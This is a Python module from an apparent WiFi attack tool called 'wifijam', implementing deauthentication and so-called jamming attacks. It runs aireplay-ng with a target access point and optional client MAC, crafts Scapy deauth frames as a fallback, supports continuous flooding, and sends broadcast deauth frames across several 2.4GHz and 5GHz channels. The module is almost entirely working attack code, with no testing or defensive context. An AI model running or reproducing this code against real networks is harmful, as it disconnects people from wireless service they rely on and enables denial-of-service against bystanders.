"""
WiFi attack operations.
Implements deauthentication and jamming attacks.
"""

import subprocess
import time
from typing import Optional, Callable
from enum import Enum
from dataclasses import dataclass

from wifijam.core.logger import get_logger
from wifijam.core.system import get_system_detector, OSType
from wifijam.core.exceptions import AttackError, UnsupportedPlatformError, PermissionError
from wifijam.wifi.adapter import WiFiAdapter
from wifijam.wifi.scanner import Network

logger = get_logger(__name__)


class AttackType(Enum):
    """Types of WiFi attacks."""
    DEAUTH = "deauth"
    JAM_24GHZ = "jam24"
    JAM_5GHZ = "jam5"
    BEACON_FLOOD = "beacon_flood"


@dataclass
class AttackConfig:
    """Attack configuration parameters."""
    attack_type: AttackType
    target_bssid: str
    target_channel: int
    packet_count: int = 100
    delay_ms: int = 100
    client_mac: Optional[str] = None  # For targeted deauth
    continuous: bool = False


class AttackManager:
    """Manages WiFi attack operations."""
    
    def __init__(self, adapter: WiFiAdapter):
        """
        Initialize attack manager.
        
        Args:
            adapter: WiFi adapter to use for attacks
        """
        self.adapter = adapter
        self.system = get_system_detector()
        self.is_attacking = False
        self.attack_process: Optional[subprocess.Popen] = None
        self.packets_sent = 0
        self.progress_callback: Optional[Callable[[int, int], None]] = None
    
    def start_attack(
        self,
        config: AttackConfig,
        progress_callback: Optional[Callable[[int, int], None]] = None
    ) -> None:
        """
        Start an attack.
        
        Args:
            config: Attack configuration
            progress_callback: Optional callback for progress updates (sent, total)
        
        Raises:
            UnsupportedPlatformError: If platform doesn't support attacks
            PermissionError: If insufficient privileges
            AttackError: If attack cannot be started
        """
        if self.is_attacking:
            raise AttackError("Attack already in progress")
        
        # Validate platform
        if self.system.os_type != OSType.LINUX:
            raise UnsupportedPlatformError(
                f"Attacks are only supported on Linux. Current OS: {self.system.os_type.value}"
            )
        
        # Check root privileges
        if not self.system.system_info.is_root:
            raise PermissionError(
                "Root privileges required for attacks. Run with sudo."
            )
        
        # Check monitor mode
        if not self.adapter.is_monitor_mode:
            raise AttackError(
                f"Adapter {self.adapter.interface} must be in monitor mode"
            )
        
        logger.info(f"Starting {config.attack_type.value} attack on {config.target_bssid}")
        
        self.is_attacking = True
        self.packets_sent = 0
        self.progress_callback = progress_callback
        
        try:
            if config.attack_type == AttackType.DEAUTH:
                self._deauth_attack(config)
            elif config.attack_type == AttackType.JAM_24GHZ:
                self._jam_attack(config, "2.4GHz")
            elif config.attack_type == AttackType.JAM_5GHZ:
                self._jam_attack(config, "5GHz")
            elif config.attack_type == AttackType.BEACON_FLOOD:
                self._beacon_flood_attack(config)
            else:
                raise AttackError(f"Unknown attack type: {config.attack_type}")
        
        except Exception as e:
            self.is_attacking = False
            logger.error(f"Attack failed: {e}")
            raise AttackError(f"Attack failed: {e}")
    
    def _deauth_attack(self, config: AttackConfig) -> None:
        """Execute deauthentication attack."""
        try:
            # Try using aireplay-ng first
            if self._deauth_with_aireplay(config):
                return
            
            # Fallback to scapy
            self._deauth_with_scapy(config)
        
        except Exception as e:
            logger.error(f"Deauth attack error: {e}")
            raise
    
    def _deauth_with_aireplay(self, config: AttackConfig) -> bool:
        """Deauth using aireplay-ng."""
        try:
            # Set channel
            subprocess.run(
                ["iwconfig", self.adapter.interface, "channel", str(config.target_channel)],
                capture_output=True,
                timeout=10
            )
            
            # Build aireplay-ng command
            cmd = [
                "aireplay-ng",
                "--deauth",
                str(config.packet_count) if not config.continuous else "0",
                "-a", config.target_bssid
            ]
            
            if config.client_mac:
                cmd.extend(["-c", config.client_mac])
            
            cmd.append(self.adapter.interface)
            
            logger.debug(f"Running: {' '.join(cmd)}")
            
            if config.continuous:
                # Run continuously
                self.attack_process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Monitor process
                while self.is_attacking and self.attack_process.poll() is None:
                    time.sleep(0.5)
                    self.packets_sent += 10  # Estimate
                    
                    if self.progress_callback:
                        self.progress_callback(self.packets_sent, -1)
            else:
                # Run for specific packet count
                self.attack_process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Monitor progress
                start_time = time.time()
                while self.is_attacking and self.attack_process.poll() is None:
                    elapsed = time.time() - start_time
                    estimated_packets = int(elapsed * 10)  # Rough estimate
                    self.packets_sent = min(estimated_packets, config.packet_count)
                    
                    if self.progress_callback:
                        self.progress_callback(self.packets_sent, config.packet_count)
                    
                    time.sleep(0.1)
                
                self.attack_process.wait(timeout=30)
            
            logger.info(f"Deauth attack completed. Sent ~{self.packets_sent} packets")
            return True
        
        except FileNotFoundError:
            logger.warning("aireplay-ng not found")
            return False
        except Exception as e:
            logger.error(f"Error in aireplay deauth: {e}")
            return False
        finally:
            self.is_attacking = False
    
    def _deauth_with_scapy(self, config: AttackConfig) -> None:
        """Deauth using Scapy."""
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            # Set channel
            subprocess.run(
                ["iwconfig", self.adapter.interface, "channel", str(config.target_channel)],
                capture_output=True,
                timeout=10
            )
            
            # Determine client MAC
            client = config.client_mac if config.client_mac else "ff:ff:ff:ff:ff:ff"
            
            # Create deauth packet
            packet = RadioTap() / Dot11(
                addr1=client,
                addr2=config.target_bssid,
                addr3=config.target_bssid
            ) / Dot11Deauth()
            
            logger.info(f"Sending deauth packets with Scapy")
            
            # Send packets
            if config.continuous:
                while self.is_attacking:
                    sendp(packet, iface=self.adapter.interface, count=10, inter=config.delay_ms/1000, verbose=0)
                    self.packets_sent += 10
                    
                    if self.progress_callback:
                        self.progress_callback(self.packets_sent, -1)
                    
                    time.sleep(0.5)
            else:
                packets_per_batch = 10
                batches = config.packet_count // packets_per_batch
                
                for i in range(batches):
                    if not self.is_attacking:
                        break
                    
                    sendp(packet, iface=self.adapter.interface, count=packets_per_batch, inter=config.delay_ms/1000, verbose=0)
                    self.packets_sent += packets_per_batch
                    
                    if self.progress_callback:
                        self.progress_callback(self.packets_sent, config.packet_count)
                    
                    time.sleep(0.1)
            
            logger.info(f"Deauth attack completed. Sent {self.packets_sent} packets")
        
        except ImportError:
            raise AttackError("Scapy not installed. Install with: pip install scapy")
        except Exception as e:
            logger.error(f"Error in scapy deauth: {e}")
            raise
        finally:
            self.is_attacking = False
    
    def _jam_attack(self, config: AttackConfig, band: str) -> None:
        """Execute jamming attack."""
        logger.info(f"Jamming {band} band")
        
        # Jamming is essentially continuous deauth on all channels
        # This is a simplified implementation
        try:
            # Determine channels based on band
            if band == "2.4GHz":
                channels = [1, 6, 11]  # Common 2.4GHz channels
            else:  # 5GHz
                channels = [36, 40, 44, 48, 149, 153, 157, 161]
            
            # Jam each channel
            for channel in channels:
                if not self.is_attacking:
                    break
                
                logger.info(f"Jamming channel {channel}")
                
                # Set channel
                subprocess.run(
                    ["iwconfig", self.adapter.interface, "channel", str(channel)],
                    capture_output=True,
                    timeout=10
                )
                
                # Send deauth packets to broadcast
                jam_config = AttackConfig(
                    attack_type=AttackType.DEAUTH,
                    target_bssid="ff:ff:ff:ff:ff:ff",
                    target_channel=channel,
                    packet_count=100,
                    delay_ms=50
                )
                
                self._deauth_with_scapy(jam_config)
                
                time.sleep(1)
        
        except Exception as e:
            logger.error(f"Jam attack error: {e}")
            raise
        finally:
            self.is_attacking = False
    
    def _beacon_flood_attack(self, config: AttackConfig) -> None:
        """Execute beacon flood attack."""
        logger.warning("Beacon flood attack not yet implemented")
        self.is_attacking = False
    
    def stop_attack(self) -> None:
        """Stop the current attack."""
        logger.info("Stopping attack")
        self.is_attacking = False
        
        if self.attack_process:
            try:
                self.attack_process.terminate()
                self.attack_process.wait(timeout=5)
            except Exception as e:
                logger.error(f"Error stopping attack process: {e}")
                try:
                    self.attack_process.kill()
                except Exception:
                    pass
            finally:
                self.attack_process = None
    
    def get_progress(self) -> tuple[int, bool]:
        """
        Get attack progress.
        
        Returns:
            Tuple of (packets_sent, is_attacking)
        """
        return (self.packets_sent, self.is_attacking)

